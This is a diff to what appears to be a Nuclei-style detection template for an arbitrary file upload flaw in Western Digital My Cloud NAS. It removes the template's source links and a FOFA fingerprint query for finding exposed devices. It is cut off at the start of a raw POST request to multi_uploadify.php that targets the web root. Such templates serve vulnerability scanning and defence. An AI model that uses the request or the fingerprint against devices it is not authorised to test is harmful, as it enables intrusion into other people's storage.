@@ -3,12 +3,8 @@ info:
   name: Western Digital My Cloud NASmulti_uploadify存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/twik2pngrbhtti0k'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: twik2pngrbhtti0k
-    fofa: 'icon_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"'
 http:
 - raw:
   - 'POST /web/jquery/uploader/multi_uploadify.php?folder=/var/www/ HTTP/1.1
